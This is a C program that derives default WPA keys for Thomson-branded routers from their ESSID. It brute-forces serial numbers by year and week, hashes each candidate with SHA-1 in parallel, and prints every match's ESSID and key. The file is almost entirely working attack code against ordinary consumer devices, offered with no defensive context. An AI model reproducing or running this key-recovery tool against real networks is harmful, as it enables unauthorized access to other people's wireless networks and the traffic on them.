/*
 * main.c
 *
 *  Created on: 2010/06/07
 *      Author: ruka
 */
 
#include <time.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include "unknown.h"
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <omp.h>
#include <sys/times.h>
#include <unistd.h>

#define ESSID 0xF85B17
#define BEGIN_YEAR 4
#define FINAL_YEAR 10

int main( int argc  , char * argv[] )
{
    int n = sizeof(dic)/sizeof("AAA");
    clock_t start, end;
    uint32_t essid = 0;
    struct tms t;
    long ticks;
    ticks = sysconf(_SC_CLK_TCK);
    if ( argc > 1 )
        essid = (uint32_t)strtol(argv[1] , NULL , 16);
    if ( essid == 0 )
    {
        essid = ESSID;
        printf("Warning: Using default essid - 0x%X\n" , essid);
    }
    start = times(&t);
    #pragma omp parallel
    {
        uint8_t message_digest[SHA_DIGEST_LENGTH];
        char unknown[7]= "123456";
        char input[13];
        SHA_CTX sha1;
        input[0] = 'C';
        input[1] = 'P';
        uint32_t * ptr = (uint32_t *)malloc(sizeof(uint32_t));
        #pragma omp for
        for( int i = 0 ; i < n; ++i  )
        {
            sprintf( unknown , "%02X%02X%02X" , (int)dic[i][0]
                                    , (int)dic[i][1], (int)dic[i][2] );        
            for ( int year = BEGIN_YEAR ; year <= FINAL_YEAR ; ++year )
            {
                for ( int week = 1 ; week <= 52 ; ++week )
                {
                    input[2] = '0' + year/10;
                    input[3] = '0' + year % 10 ;
                    input[4] = '0' + week / 10;
                    input[5] = '0' + week % 10;
                    strcpy( input + 6 , unknown);
                    //printf( "input= %s" , input );
                    SHA1_Init(&sha1);
                    SHA1_Update(&sha1 ,(const void *) input , 12 );
                    SHA1_Final(message_digest , &sha1 );
                    /*
                    * Had to copy the result backwards to match the corret response
                    * No idea why.. But heard about it in some forum...
                    */
                    memcpy(((uint8_t *)ptr) , message_digest + 19 , 1);
                    memcpy(((uint8_t *)ptr) + 1, message_digest + 18 , 1);
                    memcpy(((uint8_t *)ptr) + 2, message_digest + 17 , 1);

                    if ( (*ptr) == essid )
                    {
                        printf( "Possibility: Year - %d\tWeek: %d\n", 2000+year,  week );
                        printf("ESSID: Thomson%02X%02X%02X\t" , message_digest[17] ,
                                         message_digest[18] , message_digest[19]);
                        printf("KEY: %02X%02X%02X%02X%02X\n" , message_digest[0], message_digest[1] , 
                                        message_digest[2] , message_digest[3], message_digest[4] );
                    }


                }
            }
        }
    }
    end = times(&t);                            /* fim da medição de tempo */
    printf("Clock:           %4.4f s\n", (double)(end-start)/ticks);
    printf("User time:       %4.4f s\n", (double)t.tms_utime/ticks);
    printf("System time:     %4.4f s\n", (double)t.tms_stime/ticks);
    return 0;
}
